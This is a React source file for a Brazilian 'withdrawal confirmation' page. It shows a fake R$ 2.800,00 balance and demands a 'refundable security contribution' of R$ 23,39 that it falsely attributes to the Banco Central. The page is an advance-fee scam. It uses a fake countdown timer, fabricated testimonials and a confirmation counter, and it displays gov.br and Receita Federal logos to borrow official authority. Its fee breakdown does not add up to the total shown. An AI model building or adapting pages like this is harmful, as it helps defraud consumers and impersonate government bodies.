import { createFileRoute, Link } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { ChevronLeft, Clock, Lock } from "lucide-react";
import coinP from "@/assets/coin-p.png";
import govbr from "@/assets/govbr-logo.webp";
import receita from "@/assets/receita-federal.webp";
import lucasImg from "@/assets/testimonial-lucas.webp";
import amandaImg from "@/assets/testimonial-amanda.webp";
import carlaImg from "@/assets/testimonial-carla.webp";
import rafaelImg from "@/assets/testimonial-rafael.webp";
import sp1 from "@/assets/social-proof-1.webp";
import sp2 from "@/assets/social-proof-2.webp";
import sp3 from "@/assets/social-proof-3.webp";
import sp4 from "@/assets/social-proof-4.webp";

export const Route = createFileRoute("/confirmar-saque")({
  component: ConfirmarSaque,
});

const TESTIMONIALS = [
  {
    img: lucasImg,
    name: "Lucas M.",
    value: "R$ 5.361,52 ✓",
    text: "paguei achando q era cilada kkk mas o reembolso veio antes do saque",
    where: "São Paulo · há 12 min",
  },
  {
    img: amandaImg,
    name: "Amanda S.",
    value: "R$ 1.450 ✓",
    text: "gente eu tava morrendo de medo mas fiz e caiu certinho",
    where: "Rio de Janeiro · há 28 min",
  },
  {
    img: rafaelImg,
    name: "Rafael O.",
    value: "R$ 3.200 ✓",
    text: "terceira vez sacando ja, toda vez cai em menos de 2 min",
    where: "Belo Horizonte · há 43 min",
  },
  {
    img: carlaImg,
    name: "Carla F.",
    value: "R$ 980 ✓",
    text: "quase nao fiz por causa da taxa mas devolveram tao rapido",
    where: "Curitiba · há 1h",
  },
];

function ConfirmarSaque() {
  const [seconds, setSeconds] = useState(6 * 60 + 17);

  useEffect(() => {
    const id = setInterval(
      () => setSeconds((s) => (s > 0 ? s - 1 : 0)),
      1000,
    );
    return () => clearInterval(id);
  }, []);

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  return (
    <div className="min-h-screen bg-[#f5f5f5] max-w-[430px] mx-auto pb-10">
      {/* Header */}
      <header className="flex items-center px-3 py-4 bg-background relative">
        <Link to="/resgatar" className="w-9 h-9 flex items-center justify-center">
          <ChevronLeft size={26} className="text-foreground" strokeWidth={2.5} />
        </Link>
        <h1 className="absolute left-1/2 -translate-x-1/2 text-[16px] font-bold text-foreground">
          Confirmação de saque
        </h1>
        <div className="w-9" />
      </header>

      {/* Timer */}
      <div className="flex items-center justify-center gap-2 py-2.5 bg-pink/10 text-pink text-[13px] font-bold">
        <Clock size={14} />
        <span className="text-foreground/70 font-medium">Tempo restante:</span>
        <span className="tabular-nums text-pink">{mm}:{ss}</span>
      </div>

      <div className="px-4 pt-4 space-y-4">
        {/* Balance card */}
        <div className="bg-[#0d0d0d] rounded-[18px] p-5 pb-4 relative overflow-hidden">
          <p className="text-white/80 text-[13px] font-medium">Saldo disponível</p>
          <p className="text-white text-[34px] font-[900] leading-tight mt-0.5 tabular-nums">
            R$ 2.800,00
          </p>
          <img
            src={coinP}
            alt=""
            className="absolute right-4 top-1/2 -translate-y-1/2 w-[78px] h-[78px] object-contain"
          />
          <div className="border-t border-dashed border-white/30 mt-4" />
          <p className="text-white/70 text-[12px] mt-3">Suas transações: R$ 0,03</p>
        </div>

        {/* Contribuição de segurança */}
        <div className="bg-white rounded-[18px] p-5 shadow-sm">
          <p className="text-foreground/70 text-[13px] font-medium">
            Contribuição de segurança
          </p>
          <div className="flex items-center justify-between mt-1.5">
            <span className="text-foreground text-[26px] font-extrabold tabular-nums">
              R$ 23,39
            </span>
            <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 px-2 py-1 rounded-full">
              100% REEMBOLSÁVEL
            </span>
          </div>
          <p className="text-foreground/60 text-[12.5px] leading-snug mt-3">
            Contribuição de segurança exigida pelo Banco Central para liberação
            do saque de{" "}
            <strong className="text-foreground">R$ 2.800,00</strong>. O valor de{" "}
            <strong className="text-foreground">R$ 23,39</strong> será devolvido
            integralmente na sua chave Pix em 1 minuto.
          </p>

          <div className="mt-4 bg-[#fafafa] rounded-[12px] p-3.5">
            <p className="text-foreground/60 text-[11px] font-bold uppercase tracking-wide">
              Composição da taxa
            </p>
            <div className="flex items-center justify-between mt-2.5 text-[13px]">
              <span className="text-foreground/70">Validação BCB</span>
              <span className="text-foreground font-medium">R$ 21,90</span>
            </div>
            <div className="flex items-center justify-between mt-1.5 text-[13px]">
              <span className="text-foreground/70">Seguro antifraude</span>
              <span className="text-foreground font-medium">R$ 15,91</span>
            </div>
            <div className="flex items-center justify-between mt-2 pt-2 border-t border-[#eee] text-[13px]">
              <span className="text-foreground font-bold">Total (reembolsável)</span>
              <span className="text-foreground font-bold">R$ 23,39</span>
            </div>
          </div>
        </div>

        {/* Steps */}
        <div className="bg-white rounded-[18px] p-5 shadow-sm">
          <div className="flex items-start justify-between relative">
            {[
              { n: 1, t: "Pagar", s: "R$ 23,39" },
              { n: 2, t: "Reembolso", s: "em 1 min" },
              { n: 3, t: "R$ 2.800,00", s: "na conta" },
            ].map((step, i) => (
              <div
                key={step.n}
                className="flex-1 flex flex-col items-center text-center relative"
              >
                {i < 2 && (
                  <div className="absolute top-4 left-1/2 w-full h-0.5 bg-[#eee] -z-0" />
                )}
                <div
                  className={`relative z-10 w-8 h-8 rounded-full flex items-center justify-center text-[13px] font-bold ${
                    step.n === 1
                      ? "bg-pink text-white"
                      : "bg-[#eee] text-foreground/60"
                  }`}
                >
                  {step.n}
                </div>
                <p className="text-foreground text-[12px] font-bold mt-2">
                  {step.t}
                </p>
                <p className="text-foreground/60 text-[11px]">{step.s}</p>
              </div>
            ))}
          </div>
        </div>

        {/* CTA */}
        <button className="w-full h-[54px] bg-pink text-white font-extrabold text-[14px] rounded-[12px] flex items-center justify-center gap-2 shadow-lg shadow-pink/30 active:scale-[0.98] transition-transform">
          <Lock size={17} />
          CONFIRMAR E LIBERAR R$ 2.800,00
        </button>

        {/* Dados para reembolso */}
        <div className="bg-white rounded-[18px] p-5 shadow-sm">
          <p className="text-foreground/70 text-[13px] font-bold">
            Dados para reembolso
          </p>
          {[
            { l: "Data", v: "26/05/2026" },
            { l: "Chave PIX", v: "E-mail" },
            { l: "Valor a receber", v: "R$ 2.800,00" },
          ].map((row) => (
            <div
              key={row.l}
              className="flex items-center justify-between py-3 border-b border-[#eee] last:border-b-0 text-[13px]"
            >
              <span className="text-foreground/60">{row.l}</span>
              <span className="text-foreground font-bold">{row.v}</span>
            </div>
          ))}
        </div>

        {/* Testimonials */}
        <div className="bg-white rounded-[18px] p-5 shadow-sm">
          <p className="text-foreground text-[14px] font-extrabold">
            Quem já sacou hoje
          </p>

          <div className="mt-3 space-y-4">
            {TESTIMONIALS.map((t) => (
              <div key={t.name} className="flex gap-3">
                <img
                  src={t.img}
                  alt={t.name}
                  className="w-11 h-11 rounded-full object-cover flex-shrink-0"
                />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-foreground text-[13px] font-bold truncate">
                      {t.name}
                    </span>
                    <span className="text-emerald-600 text-[12px] font-bold whitespace-nowrap">
                      {t.value}
                    </span>
                  </div>
                  <p className="text-foreground/70 text-[12.5px] leading-snug mt-0.5">
                    "{t.text}"
                  </p>
                  <p className="text-foreground/40 text-[11px] mt-1">{t.where}</p>
                </div>
              </div>
            ))}
          </div>

          <div className="flex items-center gap-3 mt-5 pt-4 border-t border-[#eee]">
            <div className="flex -space-x-2">
              {[sp1, sp2, sp3, sp4].map((src, i) => (
                <img
                  key={i}
                  src={src}
                  alt=""
                  className="w-7 h-7 rounded-full border-2 border-white object-cover"
                />
              ))}
            </div>
            <span className="text-foreground/70 text-[12px] font-medium">
              +8.432 saques confirmados hoje
            </span>
          </div>
        </div>

        {/* Authority logos */}
        <div className="flex items-center justify-center gap-6 py-2 opacity-80">
          <img src={govbr} alt="gov.br" className="h-6 object-contain" />
          <img
            src={receita}
            alt="Receita Federal"
            className="h-9 object-contain"
          />
        </div>

        {/* Footer info */}
        <div className="text-center space-y-1 pb-4">
          <p className="text-foreground/60 text-[12px] font-bold">
            Processo 100% seguro
          </p>
          <p className="text-foreground/40 text-[11px]">
            Protocolo TT-2026-LYO03P
          </p>
          <p className="text-pink text-[12px] font-medium underline underline-offset-2">
            Precisa de ajuda?
          </p>
        </div>
      </div>
    </div>
  );
}
